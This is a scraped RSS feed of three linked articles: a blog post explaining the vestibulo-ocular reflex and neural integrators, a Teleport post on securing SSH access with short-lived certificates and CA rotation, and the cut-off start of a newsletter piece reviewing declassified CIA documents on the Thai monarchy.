<p>What‚Äôs interesting about it are both its simple wiring (at first glance), and the extensive hidden support circuitry that can tell us more about how the brain works.</p>
<p>VOR is not the only circuit that helps us keep our eyes locked on target; there are others that work in parallel. I suspect that they probably use the same underlying principles.</p>
<p>(Note: some links here are behind a paywall. Remember that it‚Äôs illegal to go to Sci-Hub and search for the DOI link of the article to get free access to it.)</p>
<h2 id="So-what‚Äôs-Vestibulo-Ocular-Reflex"><a href="#So-what‚Äôs-Vestibulo-Ocular-Reflex" title="So what‚Äôs Vestibulo-Ocular Reflex?"></a>So what‚Äôs Vestibulo-Ocular Reflex?</h2><p>Pick a point on the screen, and while looking at it, turn your head left to right. Your head will move, but your eyes will stay locked onto that point.</p>
<p>For that to happen, the muscles that control your eyeballs need to change their tension at exactly the right time and by exactly the right amount to compensate for the movement of the head. </p>
<p>While at first glance that may seem tricky, in reality, the brain deals with it the same way as the smartphone: it just uses our internal accelerometer, the <em>vestibular apparatus</em>, pictured below in the red box.</p>
<p><img src="https://i-kh.net/images/image-stabilization-in-humans/vestibular-organ.png" alt="The vestibular organ is the collection of tubes in the red box. Source: Blausen.com staff (2014). &quot;Medical gallery of Blausen Medical 2014&quot;. WikiJournal of Medicine 1 (2). DOI:10.15347/wjm/2014.010. ISSN 2002-4436"></p>
<h2 id="From-accelerometer-to-muscles"><a href="#From-accelerometer-to-muscles" title="From accelerometer to muscles"></a>From accelerometer to muscles</h2><p>From the vestibular organ, there‚Äôs a simple three-neuron-long connection that feeds the accelerometer signal to the muscles that move the eyes, first documented <a href="https://doi.org/10.1001/archneurpsyc.1933.02240140009001" target="_blank" rel="noopener">in the 1930s</a>. We can follow it to see what it does.</p>
<p><img src="https://i-kh.net/images/image-stabilization-in-humans/square31_fixed.png"></p>
<p>The neurons coming out of the vestibular organ output a steady stream of electric spikes. When the head turns left, the left vestibular neuron starts producing more electric spikes, and the right one - less. When the head stops moving, both vestibular neurons go back to the equal rate of spikes. If the head turns right, the opposite happens.</p>
<p>The signals from the vestibular neurons end up in the brainstem, the more basic part of the brain that sits between the cerebral cortex and the spine. There, another set of neurons directly connect them to the pools of motor neurons that move the eye muscles.</p>
<p>The muscle neurons, in turn, work according to rules we won‚Äôt go into right now, but it‚Äôs safe to simplify and say that the more excited they get the more the eye muscles contract.</p>
<p>So basically, when the head turns left, the increased rate of spikes from the left vestibular neuron is directly fed into the motorneurons that turn the eyes right.</p>
<p>End-to-end, this circuit is very fast. Experiments show that once the head starts turning, it takes less than 10 ms for the muscles to engage.</p>
<p>(Btw, Wikipedia has a <a href="https://en.wikipedia.org/wiki/Vestibulo%E2%80%93ocular_reflex" target="_blank" rel="noopener">different wiring diagram</a>; I‚Äôve seen it drawn both ways in papers. In practice, the result is the same either way.)</p>
<h2 id="Complication-1-the-neural-integrator"><a href="#Complication-1-the-neural-integrator" title="Complication #1: the neural integrator"></a>Complication #1: the neural integrator</h2><p>So, on the surface, it seems that we‚Äôre done. The acceleration output feeds directly into the motorneurons, the eyes move, and we‚Äôre happy.</p>
<p>But here‚Äôs the problem: when the head is done turning, the vestibular organs go back to signaling at the base rate. Then the tension in the eye muscles goes back to equal, pointing the eyes straight. That‚Äôs not what we were hoping to see.</p>
<p>To fix that, we need to add a <em>neural integrator</em> to the picture.</p>
<p><img src="https://i-kh.net/images/image-stabilization-in-humans/neural_integrator.png"></p>
<p>The neural integrator does this: (1) it collects the total velocity signal sent to the eye muscles, and (2) outputs the spikes at exactly the right rate to keep the eyes pointed in the right direction.</p>
<p>I.e. it literally integrates the angular velocity to come up with the final position.</p>
<p>Our best guess that the integrator works using some clever mutually inhibitory feedback. If the left vestibular neuron sends more spikes, the right half of the neural integrator gets more excited, and ends up inhibiting the left half more, which ends up inhibiting the right half less. <a href="https://doi.org/10.1016/B978-008045046-9.01434-0" target="_blank" rel="noopener">This entry</a> in the Encyclopedia of Neuroscience describes the math in more detail.</p>
<p><img src="https://i-kh.net/images/image-stabilization-in-humans/neural_integrator_details.png" alt="A sketch of a neural integrator model. Source: Neural Integrator Models, Encyclopedia of Neuroscience (2009), https://doi.org/10.1016/B978-008045046-9.01434-0"></p>
<p>Some papers indicate that there may be a <a href="https://doi.org/10.1007/978-3-540-29678-2_3916" target="_blank" rel="noopener">number of different neurons</a> involved, and this may be a multi-stage process.</p>
<p>(On a tangent: there isn‚Äôt just one neural integrator. There seem to be a number of them in the brain; for example, if you close your eyes and move around the room, a part of the cerebral cortex will keep an estimate of your position from your motion, though it won‚Äôt be very accurate. One of the papers linked above even argues that accumulating the evidence for two alternatives in a decision process could also be considered an integrator.)</p>
<h2 id="Complication-2-controlling-the-gain"><a href="#Complication-2-controlling-the-gain" title="Complication #2: controlling the gain"></a>Complication #2: controlling the gain</h2><p>Setting the neural integrator aside, here‚Äôs a different question: why is it that a 5¬∞ turn of the head causes a 5¬∞ turn of the eyes? What makes it not be 4¬∞, or 10¬∞? Are we just lucky that the neural connections work out to be exactly right?</p>
<p>Turns out, <a href="https://www.nature.com/articles/s41583-020-00392-x" target="_blank" rel="noopener">there‚Äôs a circuit</a> that runs through <a href="https://en.wikipedia.org/wiki/Cerebellum" target="_blank" rel="noopener">cerebellum</a> that keeps the gain (ratio of head turn to eye turn) at exactly the right value. It‚Äôs a pretty clever circuit that turns out to be so useful that the brain has copy-pasted it thousands of times (with a few changes) and reused it in nearly all motor functions, plus a number of non-motor functions.</p>
<p><img src="https://i-kh.net/images/image-stabilization-in-humans/cerebellum.png"></p>
<p>The center of this circuit are the inhibitory Purkinje cells, which, in this case, output a low, constant stream of spikes that lightly inhibit the connections from the vestibular neurons to the motorneurons.</p>
<p>The vestibular signal comes in through excitatory parallel fibers that make connections with Purkinje cells. When the head turns, these fibers make the Purkinje cell a bit more excited, making it inhibit the VOR circuit a bit more, kinda like tapping on the break.</p>
<p>Most of the time, this inhibition is just right to make the 5¬∞ head turn result in 5¬∞ eye turn. But what if it‚Äôs wrong? </p>
<p>This is where another set of neurons comes in - the climbing fibers. When the brain detects that the image on the retina lags behind motion (i.e. the inhibition is too strong), these fire. This sets the Purkinje cell ringing like a bell for a bit, and it turns off some of the connections from the parallel fibers, reducing the inhibition, and letting the eyes move faster.</p>
<p>I haven‚Äôt seen a good description for how the opposite error is fixed (eyes move too fast), but from what I remember from other circuits, the parallel-to-Purkinje connections gradually turn back on when the parallel fibers keep firing, so the error may just fix itself over time.</p>
<h2 id="That‚Äôs-it"><a href="#That‚Äôs-it" title="That‚Äôs it"></a>That‚Äôs it</h2><p>That‚Äôs basically all I know about the Vestibulo-Occular Reflex so far.  As I mentioned, there are other mechanisms to keep the eyes steady, like the neck reflexes, or the slower and finer <a href="https://en.wikipedia.org/wiki/Optokinetic_response" target="_blank" rel="noopener">Opto-Kinetic Reflex</a> that uses the information from the retina instead of the vestibular organ.</p>

      
    </div></div>]]>
            </description>
            <link>https://i-kh.net/2021/02/18/image-stabilization-in-humans/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26181737</guid>
            <pubDate>Thu, 18 Feb 2021 16:21:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SSH Certificates Security]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26181568">thread link</a>) | @alexk
<br/>
February 18, 2021 | https://goteleport.com/blog/ssh-certificates | <a href="https://web.archive.org/web/*/https://goteleport.com/blog/ssh-certificates">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      
      <a href="https://goteleport.com/blog/index.xml"><i></i></a>
      
      

        

<p><img src="https://goteleport.com/blog/images/2021/ssh-certs-security.png" width="100%" alt="SSH Certificates Security"></p>

<h2 id="ssh-access-hardening">SSH Access Hardening</h2>

<p>SSH certificates, when deployed properly, improve security.
A half-baked access system using certs is more vulnerable than a public-key-based one if a user or host gets hacked.</p>

<p>SSH is hard. Our team learned this at Rackspace, a large managed hosting and cloud provider.
We started with deploying public keys to every server. We added a jump server with a second factor login to prevent
hacks using stolen keys. Soon, infosec team asked us to log into a web portal to match SSH logins with emails.
Evolution does not produce the most efficient result, and our system did not turn out great either.
We were missing keys on some servers and found stale keys on others.
No one liked login screens popping up multiple times a day.
We received only one one-time password token, and some folks pointed their home webcam to it.</p>

<p>In 2015 we left Rackspace to build <a href="https://github.com/gravitational/teleport" data-size="large" aria-label="Star gravitational/teleport on GitHub">Teleport</a> ‚Äî a unified access plane
for infrastructure, and we started with SSH. We chose SSH certificates as the main cryptography engineering primitive. Since then our customers and open source users have deployed Teleport at most impressive systems, and Teleport went through
several security audits.</p>

<p>I would like to share some of the lessons we learned with you.
We will start with the SSH authentication basics, dig into SSH certificates
and learn what it takes to build a secure SSH certificate-based authentication.</p>

<h3 id="ssh-public-key-authentication">SSH Public Key Authentication</h3>

<p>An SSH public key is distributed openly, and anyone holding it can verify messages
signed using its private key counterpart.</p>

<p><img src="https://goteleport.com/blog/images/2021/ssh-certs-public-key-auth.png" width="100%" alt="SSH Public Key Authentication"></p>

<p>An SSH server generates a random string ‚Äî a challenge ‚Äî and asks a client to sign it.
The server verifies clients‚Äô signature to prove that the client has the private key associated with
the trusted public key. Here is how it looks on the wire:</p>

<p><img src="https://goteleport.com/blog/images/2021/ssh-certs-public-key-protocol.png" width="100%" alt="SSH Public Key Challenge"></p>

<p>Public keys constitute a solid way to authenticate and are used to secure both Web and SSH.</p>

<p>The problems with public key authentication are caused by key management: trust on first use (a.k.a. TOFU)
and rotating and revoking trusted public keys.</p>

<h3 id="trust-on-first-use">Trust On First Use</h3>

<p>When an SSH connection is first established, an SSH server sends its public key to identify
itself to a user.</p>

<p><img src="https://goteleport.com/blog/images/2021/ssh-certs-host-auth.png" width="100%" alt="SSH Host Authentication"></p>

<p>The user can accept the public key offered by the SSH server and assume that the host is trusted
if the user connects to it first time. This authentication scheme is called ‚Äútrust on first use‚Äù or TOFU.</p>

<p>If the host‚Äôs IP, name or public key change, the user can no longer trust this combination
of the hostname, the IP and the public key.</p>

<p>The user sees a scary warning.</p>

<p><img src="https://goteleport.com/blog/images/2021/ssh-certs-tofu.png" width="100%" alt="SSH TOFU"></p>

<p>The user can alert security folks or ignore the warning by removing the old key.
For cloud environments, however, an IP address and a hostname can be
reused many times. Users learn to ignore those warnings, because there is no way to learn whether it‚Äôs an attack or an IP or a hostname change. Let‚Äôs call it TOFU fatigue.</p>

<h3 id="problems-with-public-keys">Problems With Public Keys</h3>

<p>A second problem of public keys for security is caused by complexities of public key distribution.
Imagine a deployment with 100 servers and 10 users, where every user has 2 public keys.
You have to build a system that distributes 20 user‚Äôs public keys on each server and
100 public keys to every user‚Äôs computer, and keep those up to date.</p>

<p>Directory services like LDAP are used to store user‚Äôs and host‚Äôs public keys.
Every host runs an agent that connects to an LDAP server and updates public keys.
Sysadmin folks have been deploying this Keycloak and FreeIPA pair for years.</p>

<p>This system breaks down at a small and a large scale. Sysadmins of small systems
rarely deploy key management software. It‚Äôs not worth setting up FreeIPA and Keycloak for 3 nodes.
They use tools like Ansible and end up with keys going out of sync when someone loses their key, computer, or leaves the company. Sometimes, let‚Äôs face it, there is no Ansible and everyone uses the same shared key.</p>

<p>Admins of large clusters learn that the system of moving the key around stops working beyond the 1K nodes or 100 users mark ‚Äî
there are just too many keys to keep track of.</p>

<h2 id="ssh-certificates">SSH Certificates</h2>

<p>SSH certificates are built using public keys and don‚Äôt offer anything extra from a cryptography engineering standpoint.</p>

<p>A certificate authority (CA) is a trusted party that holds its own public and private key pair.
SSH CA keys are used to sign user and host SSH certificates.
An SSH certificate consists of fields signed by the certificate authority.</p>

<p><img src="https://goteleport.com/blog/images/2021/ssh-certs-certificate.png" width="100%" alt="SSH Certificate"></p>

<p>Clients cannot modify these fields without breaking the signature.</p>

<p>SSH certificate authentication extends public-key-based auth and uses the same protocol messages.
In addition to verifying the public key signature, SSH server will check whether
the certificate is signed by the trusted certificate authority.</p>

<h3 id="solving-the-tofu-problem">Solving the TOFU Problem</h3>

<p>Clients use metadata in SSH certificates to verify host identities too.
When an SSH connection is established, a host sends a signed SSH certificate to a client to verify
the host‚Äôs identity. The host‚Äôs certificate is signed by a trusted CA.
It includes information about the hostname, and has an expiration date.
Here Alice checks if she can trust the host‚Äôs cert:</p>

<p><img src="https://goteleport.com/blog/images/2021/ssh-certs-host-certs.png" width="100%" alt="SSH Host Certificates"></p>

<p>As an extra precaution, SSH clients check if the hostname or the IP matches the certificate.
It makes it harder for a malicious host to impersonate another host.
If the signature check has failed or the CA is not trusted, either a serious misconfiguration
has happened or someone is attempting a man-in-the-middle attack.</p>

<p>Even if the public key of the host has been changed because the hostname has been reused in a cloud environment
during instance re-provisioning, the certificate will still match; there will be no conflict between different
public keys.</p>

<p>Sysadmins can replace the complex system of moving hundreds of public keys around
with two files ‚Äî a host and a user SSH certificates‚Äô authority public keys.
But in practice if we had stopped at this point, we would have made SSH security much, much worse.</p>

<h3 id="compromised-users-and-hosts">Compromised Users and Hosts</h3>

<p>If a user or a host gets compromised, we have to revoke their certs.
We are back to building a system of keeping track and distributing revocation lists to users and hosts.
Even worse, if a private key of a SSH user or a host certificate authority gets compromised,
all users and hosts certificates have to be invalidated and reissued.</p>

<p>This realization hits at the worst possible moment ‚Äî when someone is hacked, there is no time to waste.
Time works against us because with every issued cert, the potential for compromise
increases. At least with public keys, we test the rotation on a regular basis. Revocation is so rare,
that it could be broken for all this time and no one would notice. This problem reminds me of backup restore ‚Äî
you either test backup and restore regularly, or all bets are off.</p>

<h2 id="making-time-work-for-you">Making Time Work for You</h2>

<p>There is one trick that makes time work in favor of security.
SSH certificates include an optional expiry date that can be verified
by a server in addition to a signature.</p>

<p><img src="https://goteleport.com/blog/images/2021/ssh-certs-short-lived.png" width="100%" alt="SSH Short Lived Certs"></p>

<p>Organizations ca issue certificates that are good for a few hours before they auto-expire
without any action. The shorter the duration for these certificates, the better.
Ideally, certs should be issued only for the duration of a session.
In practice, several hours or the duration of the workday are OK too.</p>

<p>Instead of distributing revocation lists, we can rely on time to do the job for us.</p>

<h3 id="user-certificates-and-sso">User Certificates and SSO</h3>

<p>How would users get a short-lived certificate? The best way is to use SSO
with GitHub, Okta or any other identity provider and get a cert.
Teleport opens login screen, issues a cert and delivers it back to a user‚Äôs computer:</p>

<p><img src="https://goteleport.com/blog/images/2021/ssh-certs-sso.png" width="100%" alt="SSH certs SSO"></p>

<p>Here is an example of Teleport‚Äôs CLI tool <code>tsh</code> issuing a certificate
based on my GitHub credentials.</p>

<video autoplay="" loop="" muted="" playsinline="">
  <source src="https://goteleport.com/blog/images/2021/ssh-certs-github.mp4" type="video/mp4">
  <source src="https://goteleport.com/blog/images/2021/ssh-certs-github.webm" type="video/webm">
Your browser does not support the video tag.
</video>

<p>The cert is valid for 12 hours and has my GitHub identity encoded in it.</p>

<h2 id="rotate-ca-keys">Rotate CA Keys</h2>

<p>An attacker getting access to a private key of a certificate authority can impersonate
any user or host. That‚Äôs why admins store CA private keys in the most secure place possible.
What happens if a user, a host, or a CA gets compromised? You‚Äôd need to replace certificate authority
and reissue all certs for hosts and users. Any system dealing with certs should support this out of the box.</p>

<p>Take a look at how I rotate a user CA in less than a minute with Teleport:</p>

<video autoplay="" loop="" muted="" playsinline="">
  <source src="https://goteleport.com/blog/images/2021/ssh-certs-rotation.mp4" type="video/mp4">
  <source src="https://goteleport.com/blog/images/2021/ssh-certs-rotation.webm" type="video/webm">
Your browser does not support the video tag.
</video>

<p>With user certificate authority updated, all certificates issued by the old CA become invalid.
It‚Äôs not a problem if you use SSO; users have to re-login to get new certs.
The same command rotates hosts CA as well. Instead of waiting for the compromise
to happen, we should be rotating certificate authorities every day turning
them from a precious secret to a replaceable commodity. Here again, time
will work in our favor, not against us.</p>

<h2 id="wrapping-up">Wrapping Up</h2>

<p>Use certs with caution, and beware of long-lived certificates. Rotate your CA regularly
and use SSO to get user certs. And maybe, give <a href="https://github.com/gravitational/teleport" data-size="large" aria-label="Star gravitational/teleport on GitHub">Teleport</a> a try.</p>


        
        
        <p><strong>Related Posts</strong></p>
          <ul>
            
            <li><a href="https://goteleport.com/blog/how-to-ssh-properly/">How to SSH Properly | SSH Security Best Practices</a></li>
            
            <li><a href="https://goteleport.com/blog/ssh-handshake-explained/">SSH Handshake Explained | What is SSH Handshake?</a></li>
            
            <li><a href="https://goteleport.com/blog/ssh-restricted-shells/">Restricted Shell | Restricted commands for SSH</a></li>
            
          </ul>
        

        
        
        <a href="https://goteleport.com/tags/ssh/">ssh</a>
        
        <a href="https://goteleport.com/tags/teleport/">teleport</a>
        
        <a href="https://goteleport.com/tags/security/">security</a>
        

      
      
      &nbsp;
      </article></div>]]>
            </description>
            <link>https://goteleport.com/blog/ssh-certificates</link>
            <guid isPermaLink="false">hacker-news-small-sites-26181568</guid>
            <pubDate>Thu, 18 Feb 2021 16:09:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An overview of declassified CIA cables on Thailand]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26181299">thread link</a>) | @cwwc
<br/>
February 18, 2021 | https://secretsiam.news/p/an-overview-of-declassified-cia-cables | <a href="https://web.archive.org/web/*/https://secretsiam.news/p/an-overview-of-declassified-cia-cables">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This is another extra edition of Secret Siam. Over coming weeks I‚Äôll be sharing some of my articles that have been previously published elsewhere. They will be free for everyone to read, not just paying subscribers, and I‚Äôll still be publishing two original newsletters each week. Today‚Äôs edition is an analysis of declassified CIA cables about Thailand. It was initially published in 2017, but I‚Äôve updated it to include another cable that was declassified since then.</p><p>If you‚Äôre enjoying Secret Siam and haven‚Äôt subscribed yet, please do. For $5 a month, or less with an annual subscription, you‚Äôll have full access to all newsletters and posts, and if you prefer not to pay you can sign up for free editions like this one.&nbsp;</p><p>In 2017, after a long struggle by freedom of information campaigners, the Central Intelligence Agency of the United States finally put 13 million pages of declassified documents online. These documents were already in the public domain, but previously could only be viewed on four computers at the U.S. National Archives in Maryland, available between 9 am and 4:30 pm from Monday to Friday. This meant that most people around the world could never see them.&nbsp;<a href="https://www.cia.gov/library/readingroom/">Now we all can</a>. Many of the documents are heavily redacted, but they nevertheless contain many useful insights.</p><p>Nobody should assume that the CIA was right about everything ‚Äî far from it ‚Äî and many of the documents are heavily redacted, but they nevertheless contain many useful insights. The following is an overview of documents that help shed some light on dark episodes in Thai history. It‚Äôs in chronological order, starting with the oldest documents then moving to more recent ones.</p><h4><strong>A loveless marriage and a rumoured abdication</strong></h4><p>On June 9, 1946, the 18-year-old Bhumibol Adulyadej accidentally shot his brother King Ananda Mahidol through the head when they were playing with a Colt .45 pistol in Ananda‚Äôs bedchamber in the Grand Palace in Bangkok. The distraught Bhumibol became King Rama IX the same day, but soon fled to Switzerland, ostensibly to finish his studies at the University of Lausanne, although he actually never completed his degree. Instead he was sunk in deep depression, and terrified of having to return to Bangkok to cremate the corpse of the beloved brother he had killed.</p><p>Meanwhile, Thai royalists were split about what to do about Bhumibol. Many favoured revealing the truth about the regicide, so that Bhumibol would have to abdicate and Prince Chumbhotbongs Paribatra would become monarch instead. Others thought the best solution was to try to support the weak and troubled Bhumibol and train him to play his role as a figurehead and protector of elite royalist interests. One way they tried to do this was by arranging his marriage to the feisty Sirikit Kitiyakara, who was much more audacious and bold than the struggling young king.</p><p>According to this&nbsp;<a href="https://www.cia.gov/readingroom/docs/CIA-RDP82-00457R004600410012-7.pdf">document from April 1950</a>, Bhumibol had no affection for Sirikit and was trying to avoid returning to Thailand for the cremation. In the end he was persuaded to return, and ironically he was supported by the progressive faction in the Thai government, because they believed he would be easily manipulated. This was true, but the palace and military manipulated him more cleverly than the progressives, and he ended up ruling for 70 years and doing prolonged damage to Thai democracy.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F2e34db15-3782-46e9-835d-e2ed150f5d60_1224x1584.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F2e34db15-3782-46e9-835d-e2ed150f5d60_1224x1584.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/2e34db15-3782-46e9-835d-e2ed150f5d60_1224x1584.jpeg&quot;,&quot;height&quot;:1584,&quot;width&quot;:1224,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:206761,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><h3><strong>The king and his coups</strong></h3><p>In September 1957, the notoriously corrupt army chief Sarit Thanarat seized power in a coup, deposing Field Marshal Phibun Songkhram. This was the start of a remarkable palace revival in Thailand, because unlike his predecessor Sarit pretended to respect the monarchy and used royalist propaganda to bolster his dictatorial rule.</p><p>The palace has always tried to pretend that Bhumibol was above politics and never played any part in the numerous military coups that have disfigured Thailand‚Äôs modern history. But overwhelming evidence ‚Äî including numerous declassified British and U.S. diplomatic cables ‚Äî suggest otherwise.</p><p>This&nbsp;<a href="https://www.cia.gov/readingroom/docs/CIA-RDP79-00927A001400080001-9.pdf">confidential CIA report from September 1957</a>&nbsp;says that Bhumibol admitted to US ambassador Max Waldo Bishop that he played an ‚Äúactive role in the coup‚Äù.</p><p>Bhumibol also stated that he ‚Äúintended to withdraw from the political arena‚Äù after a new government was firmly established.</p><p>This proved to be entirely untrue ‚Äî the coup of September 1957 was the beginning of a royalist resurgence in which the palace gradually established ever greater influence in Thai politics.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F8e7dfd78-fab0-48eb-81c3-c1d0c40b287a_1224x1584.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F8e7dfd78-fab0-48eb-81c3-c1d0c40b287a_1224x1584.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/8e7dfd78-fab0-48eb-81c3-c1d0c40b287a_1224x1584.jpeg&quot;,&quot;height&quot;:1584,&quot;width&quot;:1224,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:305664,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><h3>Dalai Lama not welcome</h3><p>In 1959, at the beginning of a Tibetan uprising against Chinese rule, the Dalai Lama fled his country with the help of the CIA and escaped to India, where he formed a government in exile. He began pressing for the United Nations to take action on Tibet, and wanted to visit other countries to help build support for the cause.</p><p>But according to this <a href="https://www.cia.gov/readingroom/docs/CENTRAL%20INTELLIGENCE%20BULL%5B15787673%5D.pdf">top secret bulletin</a>, King Bhumibol declined to welcome the Dalai Lama in Thailand, because he feared that a visit from a Buddhist leader would undermine his own claim to be the main ‚Äúdefender of the faith‚Äù. </p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F4e8f3547-18bd-4045-848b-9fdf73d05183_1962x718.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F4e8f3547-18bd-4045-848b-9fdf73d05183_1962x718.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/4e8f3547-18bd-4045-848b-9fdf73d05183_1962x718.jpeg&quot;,&quot;height&quot;:533,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:365310,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><h3><strong>A paranoid monarch</strong></h3><p>One consistent theme in diplomatic and intelligence cables about Bhumibol from several countries was his sense of paranoia.&nbsp;This&nbsp;<a href="https://www.cia.gov/readingroom/docs/DOC_0005973844.pdf">top secret briefing to the U.S. president in June 1967</a>&nbsp;seems to share a similar assessment, warning that when the Thai king visited Washington he was likely to exaggerate the threat from communism.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ff41f0b9c-86a3-4d1a-b1bd-f668617b79f6_1526x518.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ff41f0b9c-86a3-4d1a-b1bd-f668617b79f6_1526x518.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/f41f0b9c-86a3-4d1a-b1bd-f668617b79f6_1526x518.png&quot;,&quot;height&quot;:494,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:98398,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><h3><strong>Bhumibol versus democracy</strong></h3><p>In 1973, a student uprising in Bangkok led to the apparent overthrow of military dictatorship after nearly a quarter of a century.&nbsp;Bhumibol made a public show of support for the students at a decisive moment, and this helped foster a persistent myth ‚Äî actively promoted by the palace ‚Äî that he was a ‚Äúdemocratic‚Äù king.</p><p>In fact, Bhumibol was a reactionary figure who never felt comfortable with democracy and who believed that Thailand should be ruled by the royalist elite.</p><p>Following the unexpected events of October 1973, Bhumibol quickly became disillusioned with democracy and the palace actively conspired to undermine parliamentary rule.</p><p>This led to a savage massacre of student protesters at Thammasat University by ultra-royalist forces in October 1976. Bhumibol‚Äôs complicity in the destruction of democracy in this period is well established, but this&nbsp;<a href="https://www.cia.gov/readingroom/docs/DOC_0006007684.pdf">CIA document from February 1974</a>&nbsp;is interesting because it suggests that within six months of the student uprising the monarch had already given his permission to crush progressive forces in Thailand if necessary.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fdff67a0e-4c11-4704-9dee-e7fb5f97f826_1134x1115.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fdff67a0e-4c11-4704-9dee-e7fb5f97f826_1134x1115.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/dff67a0e-4c11-4704-9dee-e7fb5f97f826_1134x1115.jpeg&quot;,&quot;height&quot;:1115,&quot;width&quot;:1134,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:176839,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><h3>Worries over royal succession and political awakening</h3><p>Even after the withdrawal of US troops from Thailand in the mid-1970s, America continued to consider the kingdom a key Cold War ally, but was perpetually worried that Thais might be growing more receptive to other ideas. There were also concerns about the widely despised successor to the throne, Crown Prince Maha Vajiralongkorn.</p><p>An&nbsp;<a href="https://www.cia.gov/readingroom/docs/CIA-RDP03T02547R000100240001-5.pdf">intelligence assessment by several US agencies in November 1981</a>&nbsp;explicitly raised worries about royal succession as a destabilising factor in Thailand, stating:</p><blockquote><p>The current monarch‚Äôs great popularity and personal qualities enable him to play a key role in moderating national crises. The lack of an equally capable successor, however, suggests that the power of the monarchy and its stabilizing influence will decline with succession. Moreover, the independence of the Palace from the military is likely to decrease. and the Army‚Äòs political power will probably grow despite the wishes of certain junior officers that the military remain aloof from politics.</p></blockquote><p>The analysis also presciently forecast that increasing political engagement among ordinary Thais would become a significantly destabilising factor for the sclerotic Thai elite and their shaky status quo from the 1990s onwards.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd52f551d-236b-456b-a7a8-5d2e967ebba1_801x720.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd52f551d-236b-456b-a7a8-5d2e967ebba1_801x720.jpeg" 